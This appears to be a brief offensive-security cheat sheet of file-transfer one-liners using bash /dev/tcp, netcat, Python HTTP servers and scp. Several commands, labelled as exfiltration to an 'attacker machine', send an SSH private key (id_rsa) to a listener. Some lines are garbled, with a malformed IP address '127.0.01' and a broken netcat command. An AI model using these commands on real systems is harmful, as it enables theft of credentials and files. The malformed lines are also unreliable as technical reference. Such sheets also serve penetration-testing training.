Bash Upload
# Upload file over HTTP (require HTTP service running on the attacker machine)

bash -c 'echo -e "POST / HTTP/0.9 $(<id_rsa)" > /dev/tcp/127.0.01/4444'

# Exfiltrate file over TCP# Listen with Netcat on port 4444 + output redirection
nc -l -p 4444 > data

bash -c 'cat id_rsa > /dev/tcp/127.0.01/4444'

Bash Download
# Send via netcat

nc -l -p 4444 < id_rsa

# Download file on the other machine

bash -c 'cat < /dev/tcp/127.0.01/4444 > id_rsa'

Netcat
# Upload payload

nc -lnvp ; 4444nc 127.0.01 4444 < id_rsa

# Download

nc 127.0.01 4444 < id_rsa

nc -lnvp 4444 > file_saved

Python
# Python3 HTTP Server

python3 -m http.server 4444

# Python2 HTTP Server

python -m SimpleHTTPServer 4444

SCP
# Upload from local host to remote computer

scp id_rsa username@127.0.01:~/destination -P 4444

# Download from remote computer

scp user@127.0.01:~/path_to_file file_saved -P 4444
